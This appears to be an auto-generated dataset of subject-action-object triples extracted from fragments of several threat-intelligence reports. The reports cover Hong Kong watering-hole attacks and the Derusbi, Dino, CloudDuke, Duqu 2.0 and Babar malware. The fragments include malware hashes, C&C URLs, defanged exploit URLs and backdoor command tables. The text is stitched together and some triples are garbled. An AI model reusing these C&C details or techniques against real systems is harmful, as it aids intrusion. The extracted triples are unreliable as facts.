\u9577.doc\n06da4eb2ab6412c0dc7f295920eb61c4 \u9644 .doc                               CVE-2012-0158\n53baedf3765e27fb465057c48387c9b6 103\u5e74\u7b2c3\u5c46\u901a \u9304.doc                       CVE-2012-0158\n00a95fb30be2d6271c491545f6c6a707 2014 09 17 Welcome Reception for Bob CVE-2012-0158\n                                 and Jason_invitation.doc\n4ab6bf7e6796bb930be2dd0141128d06 \u7522\u8aee\u6703_Y103(2)\u59d4\u54e1\u6703_\u5f9e\u6771\u5354\u65b0\u8208\u570b\u5bb6 CVE-2012-0158\n                                 \u5d1b\u8d77(0825).doc\n</figure>\n<caption>Figure 4: Identified exploit documents for HIGHTIDE</caption>\n\nWhen the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system": [{"drops": {"A": "drops", "S": "it", "O": ["HIGHTIDE"]}}], "\n\nAt the time of this writing, the People Power website is still serving up malicious code": [{"serving up": {"A": "serving up", "S": "the People Power website", "O": ["malicious code"]}}], "\n<table>\nURL                    Meta Refresh Page\n\f\nhXXp://985.so/bUYj  N/A (HTTP 404)\nhXXp://985.so/bUYe  hXXp://58.64.178.77:80/SiteLoader\nhXXp://985.so/b6hW  hXXp://58.64.178.77/mPlayer\nhXXp://985.so/bUYf  hXXp://58.64.178.77:80/0wnersh1p\n</table>\nThese pages load scripts that conduct profiling of the system for various software, plugins, and other related information, as well as\nload Java exploits designed to install malware on the target system": [{"install": {"A": "install", "S": "Java exploits", "O": ["malware", "on the target system"]}}, {"conduct profiling": {"A": "conduct profiling", "S": "scripts", "O": ["of the system for various software, plugins, and other related information"]}}, {"load": {"A": "load", "S": "These pages", "O": ["scripts"]}}], " Back in\nMay 2011, Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits": [{"was being leveraged": {"A": "was being leveraged", "O": ["the website", "to target users with Flash Exploits"]}}], " Attackers will often upload new webshells or add simple China Chopper style\nmodifications to legitimate existing files in an attempt to maintain persistence to these systems": [{"upload": {"A": "upload", "S": "Attackers", "O": ["new webshells or add simple China Chopper style modifications"]}}], " If successful, the exploits will install either a 32-bit or 64-bit\nversion of the malware": [{"install": {"A": "install", "S": "the exploits", "O": ["either a 32-bit or 64-bit version of the malware"]}}], " This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install\nmalware on their systems": [{"install": {"A": "install", "S": "malicious Java Applets", "O": ["malware"]}}], " These\ncompromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the\nimpacted websites": [{"added": {"A": "added", "O": ["malicious JavaScript", "to legitimate code"]}}], " In the case of this post, it appears that at\nleast two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong\nKong": [{"placing": {"A": "placing", "O": ["on Pro-Democratic websites in Hong Kong", "malicious code"]}}], "\n\nAlliance for True Democracy \u00e2\u20ac\u201c Hong Kong\n\nOver the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy\n(ATD) in Hong Kong (www.atd.hk)": [{"served up": {"A": "served up", "S": "malicious code", "O": ["from the website of the Alliance for True Democracy (ATD) in Hong Kong"]}}], "\n</section>\n\n<section>\n<heading>Webshell Backdoor</heading>\n\nWhile examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it": [{"placed": {"A": "placed", "O": ["a password protected backdoor webshell", "on it"]}}], " In this particular sample an\ninteresting and notable string was observed:\n\n      C:\\wocawocawoca\\piao\\Release\\caca.pdb\n\nAlso of interest is that as observed from the Java Applet, the executable is also digitally signed by a certificate issued to \u00e2\n\u20ac\u0153WindySoft.\u00e2\u20ac\u200b\n\n<figure></figure>\n\n\nUpon execution the malware sample immediately does a DNS resolution for the following hostname:\n\n    jduhf873jdu7.blog.163.com\n\nThe PlugX sample connects to the blog and parses the page for a command for where to connect to next": [{"connects": {"A": "connects", "S": "The PlugX sample", "O": ["to the blog"]}}], " Like the ATD website, at the time of this writing the DPHK websites are also serving up malicious\ncode, so please browse with caution": [{"serving up": {"A": "serving up", "S": "the DPHK websites", "O": ["malicious code"]}}], "\n\nIt is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise": [{"been used": {"A": "been used", "O": ["the DPHK website"]}}], "\n\nThis system hosted a JavaScript file, which in turned loads a malicious Java Applet": [{"loads": {"A": "loads", "S": "a JavaScript file", "O": ["a malicious Java Applet"]}}], "\n</section>\n\n<section>\n<heading>People Power \u00e2\u20ac\u201c Hong Kong</heading>\n\nDuring the course of investigating activity related to the ATD and DPHK websites, Volexity also observed that the website of the\npolitical coalition and pan-democratic organization People Power in Hong Kong (www.peoplepower.hk) had been compromised as\nwell": [{"been compromised": {"A": "been compromised", "O": ["the website of the political coalition and pan-democratic organization People Power in Hong Kong (www.peoplepower.hk)"]}}], "\n\nCommLoop routes packets to the appropriate command handler object by locating the\ndwPacketIdentifierCode within each of the registered command handlers that matches the\nincoming packets dwPktType": [{"routes": {"A": "routes", "S": "CommLoop", "O": ["packets", "to the appropriate command handler object"]}}], " The device driver inspects incoming network traffic from any\nclient connecting to the victim machine, determines if an appropriate handshake packet occurs\nat the beginning of a new TCP session, and then makes the decision to reroute the network\ntraffic to the Derusbi malware or let the traffic continue unaltered to its original service": [{"inspects": {"A": "inspects", "S": "The device driver", "O": ["incoming network traffic from any client connecting to the victim machine"]}}, {"reroute": {"A": "reroute", "O": ["the network traffic"]}}], "\n\f\n<figure>>\nclass BD_SOCK\n{\n  // members\n  ~BD_SOCK();           // destructor\n  BD_SOCK* Copy(bool fCopySocket); // duplicate object\n\n     // member variables\n     DWORD dwLastError;\n     char szHostName[256];\n     DWORD dwListeningPortNumber;\n     SOCKET sktRemoteEndpoint;\n     SOCKET hListeningSocket;\n     };\n\nclass PCC_SOCK: BD_SOCK\n{\n  ~PCC_SOCK(); // destructor\n\n  // virtual members\n  PCC_SOCK * Copy(bool fCopyListeningSocket);\n  SOCKET ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake(int\na2, int a3, int a4, int a5, char *pszHostname, int wHostPort);\n  SOCKET ConnectToRemoteEndpointByNameAndHandshake(char *pszHostname, int\nwHostPort);\n  SOCKET ConnectToRemoteEndpointByNameAndPerformPOSTLogin(char *pszHostname,\nint wHostPort);\n  SOCKET WaitForClient();\n  int SendEncodedData(int dwPktType, void *payload, size_t dwPayloadSize);\n  int RecvEncodeData(DWORD *pdwPktType, char **pvPayload, DWORD\n*pdwPayloadSize);\n  void freeMemory(void *pMemory);\n\n     // member functions\n     int SendVictimInfo();\n     int WaitForReadEvent(int dwTimeout);\n     int SOCKSConnectWithRandomLocalPort(int dwEndPointIP, u_short hostshort);\n     int BindToRandomPort(SOCKET s);\n     int SendBuffer(SOCKET s, char *buf, int len);\n     SOCKET AcceptIncomingConnection();\n     SOCKET ConnectToRemoteEndpointByName(char *szHostName, int hostshort);\n     SOCKET ConnectToRemoteEndpoint(int dwIP, u_short wPort);\n     int ReadFromRemoteEndpoint(char *buf, int len);\n     SOCKET NewSocket();\n     int BindSocket(SOCKET s, int dwLowPort, int dwHighPort);\n     int SendAuthenicationResponse(void *pvResponse);\n     int SendHTTP200ResponseIfViaHeaderFound (char *Str);\n\n // member variables\n char compressionBuffer[65536];\n\n};\n</figure>\n<caption>Figure 1: PCC_SOCK Declaration in Pseudo-C++</caption>\n\nWith a new PCC_SOCK object allocates, DerusbiThread::DerusbiThread selects a port\nbetween 40,000 and 45,000 to use as a listening port": [{"selects": {"A": "selects", "S": "DerusbiThread::DerusbiThread", "O": ["to use as a listening port", "a port between 40,000 and 45,000"]}}], "\nThe mainLoop attempts to get the privileges for SeDebugPrivilege,\nSeLoadDriverPrivilege, SeShutdownPrivilege, and SeTcbPrivilege in order to\nperform the necessary operations to load the driver portion of the server variant": [{"get": {"A": "get", "S": "The mainLoop", "O": ["the privileges"]}}], "\nDerusbiThread::DerusbiThread binds to the specified port and opens the port as a\nlistener": [{"opens": {"A": "opens", "S": "DerusbiThread::DerusbiThread", "O": ["as a listener", "the port"]}}], "\n\nWhen loaded into memory via a LoadLibrary or equivalent function call, the server variant will\ndetermine the name of the host binary (presumably svchost.exe) as well as its own DLL\u2019s\nname": [{"loaded": {"A": "loaded", "O": ["into memory", "the server variant", "via a LoadLibrary or equivalent function call"]}}], " What makes the server variant interesting is the device driver that the variant installs": [{"installs": {"A": "installs", "S": "the variant", "O": ["the device driver"]}}], " The device driver does not capture or store any network traffic\noutside of the initial handshake inspection.\t\n</section> \u00a0\t\n \u00a0\n\f\n<section>\n<heading>Communication and Command Dispatch</heading>\nThe Derusbi server variant will select an available, random port between the range of 40,000\nand 45,000 on the victim\u2019s machine upon which to listen": [{"listen": {"A": "listen", "S": "The Derusbi server variant", "O": ["an available, random port"]}}], " This report will focus on the server-client variant (or simply,\nthe \u201cserver variant\u201d) of Derusbi, which acts as a server on a victim\u2019s machine and waits for\ncommands from a controlling client": [{"waits": {"A": "waits", "S": "Derusbi", "O": ["for commands from a controlling client"]}}], "\nThe server variant utilizes a device driver in order to hook into the Windows firewall by either\nusing largely undocumented Windows Firewall hooking techniques found in Windows XP and\nolder or by using the documented Windows Filtering Platform found in Windows Vista and later": [{"hook": {"A": "hook", "S": "The server variant", "O": ["into the Windows firewall"]}}], "\nThe server variant then attempts to determine if it has suitable access rights within the system in\norder to operation": [{"determine": {"A": "determine", "S": "The server variant", "O": ["if it has suitable access rights"]}}], "\nThe driver, after hooking the firewall using either of the two mentioned interfaces, will inspect\nincoming network packets": [{"hooking": {"A": "hooking", "S": "The driver", "O": ["the firewall"]}}], " This allows an attacker to hide their\ncommunication within a cluster of network sessions originating from a single IP such as would\nbe the case for a client performing multiple HTTP requests against a web server": [{"hide": {"A": "hide", "S": "an attacker", "O": ["their communication"]}}], " The binary then spawns a new thread that contains the main server variant code in order\nto allow the DllEntryPoint routine to return to the calling function": [{"spawns": {"A": "spawns", "S": "The binary", "O": ["a new thread"]}}], " The\nDllRegisterServer function, among other tasks, will attempt to install the server variant as a\nserver on the victim\u2019s machine": [{"install": {"A": "install", "S": "The DllRegisterServer function", "O": ["the server variant"]}}], "\n\n\n<figure></figure>\n\n         <caption>Figure 4: Possible Presentations of the Payload Section of a Derusbi Server Variant's Datagram</caption>\n\nAfter sending the server information via the VictimInfoPacket, the server variant spins off a\nCommLoop thread for the connection and returns to waiting for new connections from clients to\nappear": [{"sending": {"A": "sending", "S": "the server", "O": ["the server information"]}}], " The mainLoop function\nbegins by loading the unique infection ID for the victim\u2019s machine from the registry (under the\nkey value located at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security)": [{"loading": {"A": "loading", "S": "The mainLoop function", "O": ["the unique infection ID"]}}], " After selecting the port, the server\nvariant will wait for incoming connections and instruct the driver to redirect appropriate TCP\nsessions to the listening port": [{"redirect": {"A": "redirect", "S": "the driver", "O": ["appropriate TCP sessions"]}}], " The check for access rights effectively checks to see if the server variant\nprocess is running under the NT Authority": [{"checks": {"A": "checks", "S": "The check for access rights", "O": ["if the server variant process is running under the NT Authority"]}}], "\n</list>\n\n\n<heading> Commands </heading>\n\nSeveral\u00a0commands\u00a0can\u00a0be\u00a0executed\u00a0in": [{"executed": {"A": "executed", "O": ["in the\u00a0context\u00a0of\u00a0ramFS", "Several\u00a0commands"]}}], "\n\n\nHence,\u00a0ramFS\u00a0serves": [{"offering": {"A": "offering", "S": "ramFS", "O": ["a\u00a0disposable execution\u00a0environment\u00a0to\u00a0the\u00a0operators"]}, "serves": {"A": "serves", "S": "ramFS", "O": ["as a\u00a0protected\u00a0container\u00a0for\u00a0files\u00a0to\u00a0be\u00a0executed\u00a0on\u00a0the\u00a0machine"]}, "leaving": {"A": "leaving", "S": "ramFS", "O": ["very\u00a0few\u00a0traces\u00a0on\u00a0the\u00a0system"]}}], "\n<figure></figure> <caption> \f                                                    Figure\u00a02 </caption>\n\n\n\n\nThe\u00a0cleaner\u00a0file\u00a0contains\u00a0the\u00a0string\u00a0\u201cINSTALL\u00a0\u00adA\u00a0\u201cwusvcd\u201d\u00a0\u00adU\u201d\u00a0which,\u00a0once\u00a0executed,\u00a0will\u00a0uninstall\u00a0the\u00a0malware\nfrom": [{"uninstall": {"A": "uninstall", "S": "The\u00a0cleaner\u00a0file", "O": ["the\u00a0malware", "from the\u00a0machine"]}}], "\n\n<table>\n  Command                                  Meaning\n                      Change\u00a0the\u00a0current\u00a0work\u00a0directory\u00a0on\u00a0the\u00a0real\u00a0file\n       CD\n                                          system\n      MD               N/A:\u00a0the\u00a0command\u00a0is\u00a0actually\u00a0not\u00a0implemented\n                      Installation\u00a0or\u00a0de\u00adinstallation\u00a0of\u00a0Dino,\u00a0in\u00a0Windows\n   INSTALL\n                                  registry\u00a0and/or\u00a0as\u00a0a\u00a0service\n   EXTRACT            Extracts\u00a0a\u00a0file\u00a0stored\u00a0in\u00a0ramFS\u00a0onto\u00a0the\u00a0machine\n    DELETE                  Deletes\u00a0a\u00a0file\u00a0stored\u00a0on\u00a0the\u00a0machine\n     EXEC                      Executes\u00a0a\u00a0file\u00a0stored\u00a0in\u00a0ramFS\n    INJECT          Injects\u00a0a\u00a0file\u00a0stored\u00a0in\u00a0ramFS\u00a0into\u00a0a\u00a0running\u00a0process\n    SLEEP                     Sleeps\u00a0for\u00a0a\u00a0given\u00a0amount\u00a0of\u00a0time\n      KILL                      Terminates\u00a0a\u00a0running\u00a0process\n   AUTODEL             N/A:\u00a0the\u00a0command\u00a0is\u00a0actually\u00a0not\u00a0implemented\n</table>\n\n<heading> Usage\u00a0of\u00a0ramFS\u00a0in\u00a0Dino </heading>\n\nIn\u00a0the\u00a0case\u00a0of\u00a0Dino,\u00a0ramFS\u00a0serves\u00a0as\u00a0protected\u00a0storage\u00a0for\u00a0one\u00a0specific\u00a0file\u00a0containing\u00a0the\u00a0instructions\u00a0to\nremove": [{"remove": {"A": "remove", "S": "Dino", "O": ["from the\u00a0machine", "the\u00a0malware"]}}], "\n<figure></figure> <caption> \f                                                       Figure\u00a01 </caption>\n\n\n\n\nFinally,\u00a0DataStore\u00a0objects\u00a0can\u00a0be\u00a0serialized\u00a0in\u00a0a\u00a0custom\u00a0format,\u00a0which\u00a0begins\u00a0with\u00a0the\u00a0magic\u00a0word\u00a0\u201cDxSx\u201d.\u00a0This\nis\u00a0used\u00a0in\u00a0particular\u00a0by\u00a0the\u00a0PSM\u00a0module\u00a0to\u00a0save": [{"save": {"A": "save", "S": "PSM\u00a0module", "O": ["in an\u00a0encrypted\u00a0file", "the\u00a0content\u00a0of\u00a0Dino\u00a0modules"]}}], "\n</section>\n\n<section>\n<heading> Introduction </heading>\n\nThe\u00a0sample\u00a0of\u00a0Dino\u00a0documented\u00a0in\u00a0this\u00a0blog\u00a0post\u00a0was\u00a0used\u00a0in\u00a02013\u00a0against\u00a0targets\u00a0in\u00a0Iran.\u00a0The\u00a0original\u00a0means\nof\u00a0infection\u00a0is\u00a0unknown,\u00a0though\u00a0we\u00a0believe\u00a0Dino\u00a0was\u00a0installed\u00a0by\u00a0another\u00a0program,\u00a0as\u00a0it\u00a0contains\u00a0an\nuninstallation\u00a0command\u00a0without\u00a0the\u00a0corresponding\u00a0installation\u00a0procedure.\u00a0Given\u00a0the\u00a0set\u00a0of\u00a0commands\u00a0it\u00a0can\nreceive,": [{"be": {"A": "be", "S": "Dino\u2019s\u00a0main\u00a0goal", "O": ["the\u00a0exfiltration\u00a0of\u00a0files", "from its\u00a0targets"]}}], "\n</section>\n\n<section>\n<heading> Attribution </heading>\n\n<heading> Dino\u00a0Belongs\u00a0To\u00a0The\u00a0Farm </heading>\n\nThe\u00a0amount\u00a0of\u00a0shared\u00a0code\u00a0between\u00a0Dino\u00a0and\u00a0known\u00a0Animal\u00a0Farm\u00a0malware\u00a0leaves\u00a0very\u00a0little\u00a0doubt\u00a0that\u00a0Dino\nbelongs\u00a0to\u00a0Animal\u00a0Farm\u2019s\u00a0arsenal.\u00a0Among\u00a0these\u00a0shared\u00a0features,\u00a0we\u00a0can\u00a0cite\u00a0the\u00a0following:\n\n\n   At\u00a0the\u00a0very\u00a0beginning\u00a0of\u00a0Dino\u00a0execution,": [{"checked": {"A": "checked", "S": "Dino", "O": ["against process\u00a0names\u00a0used by\u00a0some\u00a0sandboxes", "the\u00a0current\u00a0process\u00a0name"]}}], "\n\n\n   \u201cComServer\u201d:\u00a0These\u00a0keys": [{"contain": {"A": "contain", "S": "These\u00a0keys", "O": ["the\u00a0command\u00a0and\u00a0control\u00a0(C&C)\u00a0servers\u2019\u00a0URLs"]}}], "\n\n\nAt\u00a0startup\u00a0Dino\u00a0executes\u00a0successively\u00a0the\u00a0commands\u00a0stored\u00a0in\u00a0the\u00a0\u201cInitialCommands\u201d\u00a0field\u00a0in\u00a0its\u00a0configuration\u037e\nin\u00a0the\u00a0sample\u00a0we\u00a0analyzed\u00a0they\u00a0are:\n\n\n<list>\nsysinfo\ncominfos\n!ipconfig\u00a0/all\n!ipconfig\u00a0/displaydns\n!tracert\u00a0www.google.com\n</list>\n\n\nThose\u00a0commands\u00a0serve\u00a0as\u00a0a\u00a0reconnaissance\u00a0step\u00a0for\u00a0the\u00a0operators.\u00a0Their\u00a0execution\u00a0is\u00a0managed\u00a0by\u00a0the\nCMDEXEC\u00a0module,\u00a0the\u00a0commands\u00a0being\u00a0stored\u00a0in\u00a0a\u00a0queue\u00a0inside\u00a0the\u00a0CMDEXECQ\u00a0module.\u00a0The\u00a0result\u00a0is\nreported\u00a0to": [{"reported": {"A": "reported", "O": ["The\u00a0result", "to the\u00a0C&C\u00a0server"]}}], "\n\n\nRoughly,\u00a0Dino\u00a0can\u00a0be\u00a0described\u00a0as\u00a0an\u00a0elaborate\u00a0backdoor\u00a0built\u00a0in\u00a0a\u00a0modular\u00a0fashion.\u00a0Among\u00a0its\u00a0technical\ninnovations,\u00a0there\u00a0is\u00a0a\u00a0custom\u00a0file\u00a0system\u00a0to\u00a0execute\u00a0commands\u00a0in": [{"execute": {"A": "execute", "S": "its", "O": ["in a\u00a0stealthy\u00a0fashion", "commands"]}}], "\n   archive              Create\u00a0an\u00a0archive\u00a0from\u00a0given\u00a0file\u00a0paths\n  unarchive              Unpack\u00a0an\u00a0archive\u00a0to\u00a0a\u00a0given\u00a0location\n                 Schedule\u00a0a\u00a0file\u00a0transfer\u00a0to\u00a0the\u00a0C&C\u00a0using\u00a0the\u00a0FMGR\n  download\n                                        module\n                Remove\u00a0the\u00a0next\u00a0file\u00a0transfer\u00a0scheduled\u00a0in\u00a0the\u00a0FMGR\n   cancel\n                                       module\n  cancelall    Remove\u00a0all\u00a0scheduled\u00a0file\u00a0transfers\u00a0in\u00a0the\u00a0FMGR\u00a0module\n               Schedule\u00a0a\u00a0command\u00a0to\u00a0be\u00a0executed\u00a0at\u00a0a\u00a0certain\u00a0time\u00a0by\n   cronadd       the\u00a0CRONTAB\u00a0module\u00a0(see\u00a0CRONTAB\u00a0description\n                                below\u00a0for\u00a0details)\n   cronlist        List\u00a0registered\u00a0entries\u00a0in\u00a0the\u00a0CRONTAB\u00a0module\n   crondel            Remove\u00a0an\u00a0entry\u00a0in\u00a0the\u00a0CRONTAB\u00a0module\n                  Schedule\u00a0a\u00a0wake\u00adup\u00a0of\u00a0the\u00a0malware\u00a0after\u00a0a\u00a0certain\n   wakeup\n                    amount\u00a0of\u00a0time\u00a0using\u00a0the\u00a0CRONTAB\u00a0module\n    restart         N/A:\u00a0the\u00a0command\u00a0is\u00a0actually\u00a0not\u00a0implemented\n   showip            Display\u00a0the\u00a0public\u00a0IP\u00a0of\u00a0the\u00a0infected\u00a0machine\n  cominfos     Display\u00a0information\u00a0about\u00a0the\u00a0currently\u00a0used\u00a0C&C\u00a0server\n comallinfos      Display\u00a0information\u00a0about\u00a0all\u00a0known\u00a0C&C\u00a0servers\n               Download\u00a0a\u00a0file\u00a0from\u00a0the\u00a0currently\u00a0used\u00a0C&C\u00a0server\u00a0onto\n    wget\n                                     the\u00a0machine\n   delayttk     Delay\u00a0the\u00a0de\u00adinstallation\u00a0of\u00a0the\u00a0malware,\u00a0if\u00a0scheduled\n</table>\n\n\fOne\u00a0command\u00a0of\u00a0particular\u00a0interest\u00a0is\u00a0\u201csearch\u201d,\u00a0which\u00a0allows\u00a0the\u00a0operators\u00a0to\u00a0look\u00a0for": [{"look\u00a0for": {"A": "look\u00a0for", "S": "the\u00a0operators", "O": ["files"]}}], "\n\n\nRoughly,": [{}], "\n</section>\n\n<section>\n<heading> RamFS:\u00a0A\u00a0Temporary\u00a0File\u00a0System </heading>\n\nDino\u00a0contains": [{"store": {"A": "store", "S": "a\u00a0custom\u00a0file\u00a0system", "O": ["files", "in memory"]}}], "\n\n\n   \u201cBD_Keys\u201d\u00a0and\u00a0\u201cCC_Keys\u201d\u00a0contain\u00a0cryptographic\u00a0keys\u00a0to": [{"encrypt": {"A": "encrypt", "O": ["the\u00a0network\u00a0communications", "with C&C servers"]}}], "\n</section>\n\n<section>\n<heading> Tasks\u00a0scheduling\u00a0in\u00a0a\u00a0Unix\u00a0fashion </heading>\n\nThe\u00a0commands\u00a0\u201ccronadd\u201d,\u00a0\u201ccronlist\u201d\u00a0and\u00a0\u201ccrondel\u201d\u00a0serve\u00a0respectively\u00a0to\u00a0add,\u00a0list,\u00a0and\u00a0remove": [{"add": {"A": "add", "O": ["scheduled\u00a0tasks"]}}], " If successful, OneDriveSolution will then proceed\nto copy data from the victim's computer to the OneDrive account": [{"copy": {"A": "copy", "S": "OneDriveSolution", "O": ["from the victim's computer", "data", "to the OneDrive account"]}}, {"copy": {"A": "copy", "S": "OneDriveSolution", "O": ["from the victim's computer", "to the OneDrive account", "data"]}}], " The purpose of the downloader is to download and execute additional malware on the\nvictim's system": [{"download": {"A": "download", "S": "the downloader", "O": ["additional malware", "on execute additional malware"]}, "execute": {"A": "execute", "S": "the downloader", "O": ["additional malware", "on download additional malware"]}}], " This second component, internally called\n\"OneDriveSolution\", is especially interesting because it relies on Microsoft's cloud storage service\nOneDrive as its command and control channel": [{"relies on": {"A": "relies on", "S": "it", "O": ["Microsoft's cloud storage service OneDrive", "as its command and control channel"]}}], " In most cases,\nexecuting these executables will have resulted in two additional files being written to the victim's hard\ndisk": [{"written": {"A": "written", "O": ["two additional files", "to the victim's hard disk"]}}, {"written": {"A": "written", "O": ["to the victim's hard disk", "two additional files"]}}], " </caption>\n\n\nAll of the CloudDuke \"solutions\" use the same loader, a piece of code whose primary purpose is to decrypt\nthe embedded, encrypted solution, load it in memory and execute it": [{"execute": {"A": "execute", "S": "the same loader", "O": ["it"]}, "load": {"A": "load", "S": "the same loader", "O": ["in memory", "it"]}}], " In most observed cases, the downloader will attempt to connect to a compromised\nwebsite to download an encrypted malicious payload which the downloader will decrypt and execute": [{"execute": {"A": "execute", "S": "the downloader", "O": ["an encrypted malicious payload"]}, "download": {"A": "download", "S": "the downloader", "O": ["an encrypted malicious payload"]}, "connect": {"A": "connect", "S": "the downloader", "O": ["to a compromised website"]}}], " It will also search the OneDrive account\nfor files containing commands for the malware to execute": [{"search": {"A": "search", "S": "It", "O": ["the OneDrive account", "for files containing commands for the malware to execute"]}}], " Detection based on communications </heading>\n\nThe malware can transmit information through HTTP traffic": [{"transmit": {"A": "transmit", "S": "The malware", "O": ["information", "through HTTP traffic"]}}], " String decryption </heading>\n\nSome of the strings in Duqu 2.0 are obfuscated by XOR-based encryption": [{"are obfuscated": {"A": "are obfuscated", "O": ["Some of the strings in Duqu 2.0", "by XOR-based encryption"]}}], " AES encryption of the configuration file </heading>\n\nThe analyzed main module of Duqu 2.0 and also the old Duqu sample reads configuration\ninformation from a special file": [{"reads": {"A": "reads", "S": "The analyzed main module of Duqu 2.0 and also the old Duqu sample", "O": ["configuration information", "from a special file"]}}], " These proxies can act as HTTP or HTTPS servers": [{"act": {"A": "act", "S": "These proxies", "O": ["HTTP or HTTPS servers"]}}], " Logging functions </heading>\n\nWe\u2019ve identified a characteristic logging function that is present in both Duqu and Duqu 2.0,\nand is used extensively in the networking (mainly HTTP handling) part of the code": [{"is used": {"A": "is used", "O": ["in the networking (mainly HTTP handling) part of the code", "a characteristic logging function"]}}], " It is most likely that one or more\ninfected computers can be proxy points towards the attacker, meaning that other infected\ncomputers communicate with these proxies": [{"be": {"A": "be", "S": "one or more infected computers", "O": ["towards the attacker", "proxy points"]}}], "\n\n \n<heading> 3.2 BABAR CAME TO STAY </heading>\n\nThe startup routine of the Babar implant will create a registry key under\n'[HKU]\\..\\CurrentVersion\\Run' to assure persistence": [{"create": {"A": "create", "S": "The startup routine of the Babar implant", "O": ["under '[HKU]\\..\\CurrentVersion\\Run'", "a registry key", "to assure persistence"]}}], "\n\nApart from that, Babar comes with a userland rootkit component which applies global Windows\nhooks to invade all processes on its desktop": [{"applies": {"A": "applies", "S": "a userland rootkit component", "O": ["global Windows hooks", "to invade all processes on its desktop"]}}], " MISCREANT'S IMPLANT </heading>\n\nBabar's implant is a 32-bit DLL written in C++, which upon start injects itself to running processes\nand invades desktop applications by applying a global Windows hooks": [{"invades": {"A": "invades", "S": "Babar's implant", "O": ["desktop applications", "by applying a global Windows hooks"]}, "injects": {"A": "injects", "S": "Babar's implant", "O": ["to running processes", "itself"]}}], " As opposed to\npersistence, Babar also implements functionality to uninstall itself from the affected system": [{"uninstall": {"A": "uninstall", "S": "Babar", "O": ["from the affected system", "itself"]}}], " The predefined groups of\napplication names retrieved from the hardcoded configuration data set the scope of Babar's\nhooking advances:\n\n<list>\n   \u2022   Internet communication\n       iexplore.exe,firefox.exe,opera.exe,chrome.exe,Safari.exe,msnmsgr.exe\n\n   \u2022   File creation\n       excel.exe, winword.exe, powerpnt.exe, visio.exe, acrord32.exe, notepad.exe,\n       wordpad.exe.txt, rtf, xls, xlsx, ppt, pptx, doc, docx, pdf, vsd\n\n   \u2022   Media\n       skype.exe, msnmsgr.exe, oovoo.exe, nimbuzz.exe, googletalk.exe, yahoomessenger.exe, x-\n       lite.exe\n</list>\n\nThe respective trampolines steal data going in or out of the hooked APIs on the fly": [{"steal": {"A": "steal", "S": "The respective trampolines", "O": ["data going in or out of the hooked APIs", "on the fly"]}}], " MISCREANT'S DROPPER </heading>\n\nThe dropper operates straight forward; it fetches the encrypted DLL from its own binary from\noutside its resource section, decrypts it and hides it in the file system": [{"hides": {"A": "hides", "S": "it", "O": ["it", "in the file system"]}, "fetches": {"A": "fetches", "S": "it", "O": ["the encrypted DLL", "from its own binary from outside its resource section"]}}], "\n\nA global Windows hook is installed into the Windows event chain": [{"installed": {"A": "installed", "O": ["A global Windows hook", "into the Windows event chain"]}}], "\n\n\n<heading> 3.5.2 INVADING DESKTOP PROCESSES </heading>\n\nThe Babar implant applies global Windows hooks to load its DLL into the process space of other\nprocesses": [{"applies": {"A": "applies", "S": "The Babar implant", "O": ["global Windows hooks"]}, "load": {"A": "load", "S": "The Babar implant", "O": ["its DLL", "into the process space of other processes"]}}], " The analyzed malware consists of a dropper and an\nimplant, which invades Windows processes to steal data from instant messengers, softphones,\nbrowsers and office applications": [{"steal": {"A": "steal", "S": "an implant", "O": ["from instant messengers, softphones, browsers and office applications", "data"]}}], "\n\nFor grabbing audio streams Babar includes code\nfrom the OpenCORE AMR library [8]": [{"includes": {"A": "includes", "S": "Babar", "O": ["For grabbing audio streams", "code from the OpenCORE AMR library"]}}], " This way Babar can install API hooks for various APIs\nvia Windows Detours technique to actively steal data from arbitrary processes": [{"steal": {"A": "steal", "S": "Babar", "O": ["data", "from arbitrary processes"]}, "install": {"A": "install", "S": "Babar", "O": ["API hooks for various APIs", "via Windows Detours technique"]}}], "\n\n\n\n\n                                                                                              <footer>  page | 9 </footer>\n\n<figure></figure> <caption> \f                         Illustration 3 | Named pipes opened by the main instance </caption>\n\n\n\n\n<heading> 3.5 FUNCTIONALITY </heading>\n\nThe spying activities are performed either through the Babar instance locally or via a global\nWindows hook invading all processes running in the same desktop": [{"performed": {"A": "performed", "O": ["through the Babar instance", "The spying activities", "via a global Windows hook invading all processes running in the same desktop"]}}], " The implant is capable of\nlogging keystrokes, capture screen shots, spy on installed softphones and instant messengers next\nto a list of simpler espionage tricks": [{"logging": {"A": "logging", "S": "The implant", "O": ["keystrokes"]}, "capture": {"A": "capture", "S": "The implant", "O": ["screen shots"]}}], "\n\nThe analyzed sample of Babar has two hard coded C&C server addresses which are included in its\nconfiguration data:\n\n<list>\n   \u2022   http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php\n   \u2022   http://www.gezelimmi.com/wp-includes/misc/bb/index.php\n</list>\n\nBoth servers were used to push spied information onto the remote site": [{"push": {"A": "push", "O": ["spied information", "onto the remote site"]}}, {"has": {"A": "has", "S": "Babar", "O": ["two hard coded C&C server addresses"]}}], "\n\n\n\n\n                                                                                          <footer>  page | 10 </footer>\n<figure></figure> <caption> \f               Illustration 4 | The keylogger module uses Windows RAWINPUT to achieve its goal </caption>\n\n\nThe snooped keystroke data is passed to a thread, which performs encryption and dumps the data\nto a log file": [{"performs": {"A": "performs", "S": "a thread", "O": ["encryption"]}}], "\n\n<list>\n4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f                      ThreatFire\n522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b                      Rising\n2fd5c42d49f9e0fe2daae5b0f78cf9cfde9bfc7b0ed59fc68e0a79a3b16fe05b\n06e387bb79584cdff3672feadea0bf6f783ce1ddc1fa91962d1b5bcd94e1a308\nf1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56                      Kaspersky\n588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c                      ZoneAlarm\nc8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479\nb3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676       